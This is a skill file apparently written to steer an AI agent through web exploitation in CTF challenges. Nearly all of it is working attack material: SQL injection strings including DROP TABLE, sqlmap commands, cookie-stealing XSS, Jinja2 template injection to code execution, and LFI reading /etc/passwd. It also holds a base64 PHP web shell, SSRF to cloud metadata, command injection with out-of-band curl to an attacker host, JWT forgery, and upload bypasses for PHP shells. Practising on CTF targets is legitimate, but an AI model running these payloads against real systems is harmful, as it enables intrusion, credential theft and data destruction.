---
name: ctf-web
description: >-
  Activate this skill when a CTF challenge involves a web application. Covers
  SQL injection, XSS, SSRF, SSTI, LFI/RFI, XXE, deserialization, JWT attacks,
  OAuth flaws, IDOR, path traversal, command injection, and web crypto attacks.
  Use after ctf-recon has identified HTTP/HTTPS services.
---

# CTF Web Exploitation Skill

## Vulnerability Checklist (run in order)

### 1. SQL Injection
```bash
# Manual test
' OR '1'='1
' OR 1=1--
'; DROP TABLE users;--

# Automated
sqlmap -u "http://<TARGET>/page?id=1" --dbs --batch
sqlmap -u "http://<TARGET>/login" --data="user=admin&pass=test" --dbs --batch --level=5 --risk=3
```

### 2. XSS / SSTI
```
# XSS probes
<script>alert(1)</script>
<img src=x onerror=alert(document.cookie)>

# SSTI probes (try all engines)
{{7*7}}          # Jinja2/Twig → 49
${7*7}           # FreeMarker/EL
<%= 7*7 %>       # ERB
#{7*7}           # Ruby

# SSTI to RCE (Jinja2)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### 3. LFI / Path Traversal
```
# Basic
/page?file=../../../../etc/passwd
/page?file=....//....//....//etc/passwd

# PHP wrappers
php://filter/convert.base64-encode/resource=/etc/passwd
php://input (POST: <?php system($_GET['cmd']); ?>)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Log poisoning → LFI to RCE
# Poison User-Agent then include /var/log/apache2/access.log
```

### 4. SSRF
```
# Basic SSRF
http://localhost/admin
http://127.0.0.1:8080/internal
http://169.254.169.254/latest/meta-data/  # AWS IMDSv1

# Bypass filters
http://2130706433/  # 127.0.0.1 decimal
http://0x7f000001/  # hex
http://[::1]/       # IPv6
```

### 5. Command Injection
```bash
# Detection
; id
| id
`id`
$(id)
&& id

# Blind (out-of-band)
; curl http://<ATTACKER>/`id`
; ping -c 1 <ATTACKER>
```

### 6. JWT Attacks
```python
# Algorithm confusion (RS256 → HS256)
# Crack with jwt_tool or hashcat
jwt_tool <TOKEN> -C -d /path/to/wordlist.txt
jwt_tool <TOKEN> -X a  # alg:none
jwt_tool <TOKEN> -X k -pk public.pem  # RS→HS256 confusion
```

### 7. File Upload Bypass
```
# Extension bypass: .php.jpg, .pHp, .php5, .phtml, .phar
# Magic bytes: prepend GIF89a; to PHP shell
# Content-Type: image/jpeg (for PHP shell)
```

## Automation Tools
```bash
# Burp Suite (intercept & fuzz)
# FFUF (fast fuzzing)
ffuf -u http://<TARGET>/FUZZ -w wordlist.txt -mc 200,301,302

# Nuclei (template scanner)
nuclei -u http://<TARGET> -t cves/ -t vulnerabilities/
```

## Flag Extraction Checklist
- Check cookies, headers, response body
- Check database tables for flag columns
- Check `/flag`, `/flag.txt`, `/etc/flag` on LFI
- Check environment variables: `printenv | grep -i flag`

## Structured Output
```json
{
  "agent": "ctf-web",
  "vulns_found": [],
  "exploit_chain": [],
  "shells_obtained": [],
  "flag_candidates": [],
  "confidence": 0.0
}
```
